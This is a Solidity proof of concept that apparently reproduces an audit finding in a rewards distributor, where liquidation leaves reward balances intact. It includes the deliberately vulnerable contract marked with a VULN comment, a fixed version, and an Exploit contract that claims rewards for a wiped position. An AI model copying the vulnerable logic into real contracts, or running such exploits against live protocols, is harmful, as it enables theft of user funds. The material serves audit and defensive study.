// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ZeroLend One — NFTRewardsDistributor.earned (Sherlock 2024-06, H-8).
    liquidate() zeroes collateral and does not touch _balances. The next
    reward index still pays the liquidated tokenId. Alice and Bob each
    have 100 units. A 10 token distribution pays Alice 5 after her
    collateral is 0. The control clears the balance and Alice is paid 0. */

contract RewardToken {
    string public symbol = "ZERO";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NFTRewards {
    RewardToken public reward;
    mapping(uint256 => mapping(bytes32 => uint256)) public _balances;
    mapping(uint256 => mapping(bytes32 => uint256)) public userRewardPerTokenPaid;
    mapping(uint256 => mapping(bytes32 => uint256)) public rewards;
    mapping(bytes32 => uint256) public rewardPerTokenStored;
    mapping(bytes32 => uint256) public totalBalance;
    mapping(uint256 => uint256) public collateral;

    constructor(RewardToken _reward) {
        reward = _reward;
    }

    function rewardPerToken(bytes32 assetHash) public view returns (uint256) {
        return rewardPerTokenStored[assetHash];
    }

    function earned(uint256 tokenId, bytes32 _assetHash) public view returns (uint256) {
        return _balances[tokenId][_assetHash] * (rewardPerToken(_assetHash) - userRewardPerTokenPaid[tokenId][_assetHash]) / 1e18
            + rewards[tokenId][_assetHash];
    }

    function supply(uint256 tokenId, bytes32 assetHash, uint256 amount) external {
        _balances[tokenId][assetHash] += amount;
        totalBalance[assetHash] += amount;
        collateral[tokenId] += amount;
    }

    function notifyRewardAmount(bytes32 assetHash, uint256 amount) external {
        uint256 supply_ = totalBalance[assetHash];
        reward.mint(address(this), amount);
        rewardPerTokenStored[assetHash] += amount * 1e18 / supply_;
    }

    function liquidate(uint256 tokenId, bytes32 assetHash) external {
        collateral[tokenId] = 0;
        assetHash;
    }

    function getReward(uint256 tokenId, bytes32 assetHash, address to) external returns (uint256 amt) {
        amt = earned(tokenId, assetHash);
        userRewardPerTokenPaid[tokenId][assetHash] = rewardPerTokenStored[assetHash];
        rewards[tokenId][assetHash] = 0;
        // @> VULN: earned() still multiplies the pre-liquidation balance, so a wiped position is paid
        require(reward.transfer(to, amt), "pay");
    }
}

contract NFTRewardsFixed {
    RewardToken public reward;
    mapping(uint256 => mapping(bytes32 => uint256)) public _balances;
    mapping(uint256 => mapping(bytes32 => uint256)) public userRewardPerTokenPaid;
    mapping(bytes32 => uint256) public rewardPerTokenStored;
    mapping(bytes32 => uint256) public totalBalance;
    mapping(uint256 => uint256) public collateral;

    constructor(RewardToken _reward) {
        reward = _reward;
    }

    function earned(uint256 tokenId, bytes32 assetHash) public view returns (uint256) {
        return _balances[tokenId][assetHash] * (rewardPerTokenStored[assetHash] - userRewardPerTokenPaid[tokenId][assetHash]) / 1e18;
    }

    function supply(uint256 tokenId, bytes32 assetHash, uint256 amount) external {
        _balances[tokenId][assetHash] += amount;
        totalBalance[assetHash] += amount;
        collateral[tokenId] += amount;
    }

    function notifyRewardAmount(bytes32 assetHash, uint256 amount) external {
        reward.mint(address(this), amount);
        rewardPerTokenStored[assetHash] += amount * 1e18 / totalBalance[assetHash];
    }

    function liquidate(uint256 tokenId, bytes32 assetHash) external {
        totalBalance[assetHash] -= _balances[tokenId][assetHash];
        _balances[tokenId][assetHash] = 0;
        collateral[tokenId] = 0;
    }

    function getReward(uint256 tokenId, bytes32 assetHash, address to) external returns (uint256 amt) {
        amt = earned(tokenId, assetHash);
        userRewardPerTokenPaid[tokenId][assetHash] = rewardPerTokenStored[assetHash];
        if (amt > 0) require(reward.transfer(to, amt), "pay");
    }
}

contract Exploit {
    bytes32 public constant ASSET = keccak256("TOKEN_A");
    RewardToken public reward;
    NFTRewards public distributor;
    uint256 public claimed;
    uint256 public aliceBalance;
    uint256 public aliceCollateral;

    constructor() {
        reward = new RewardToken();
        distributor = new NFTRewards(reward);
    }

    function run() external {
        distributor.supply(1, ASSET, 100 ether);
        distributor.supply(2, ASSET, 100 ether);
        distributor.liquidate(1, ASSET);
        aliceCollateral = distributor.collateral(1);
        aliceBalance = distributor._balances(1, ASSET);
        distributor.notifyRewardAmount(ASSET, 10 ether);
        uint256 owed = distributor.earned(1, ASSET);
        claimed = distributor.getReward(1, ASSET, address(this));
        require(aliceCollateral == 0, "wiped");
        require(aliceBalance == 100 ether, "stale");
        require(owed == 5 ether, "owed");
        require(claimed == 5 ether, "claimed");
        require(reward.balanceOf(address(this)) == 5 ether, "stolen");
        require(distributor.earned(2, ASSET) == 5 ether, "bob");
    }
}
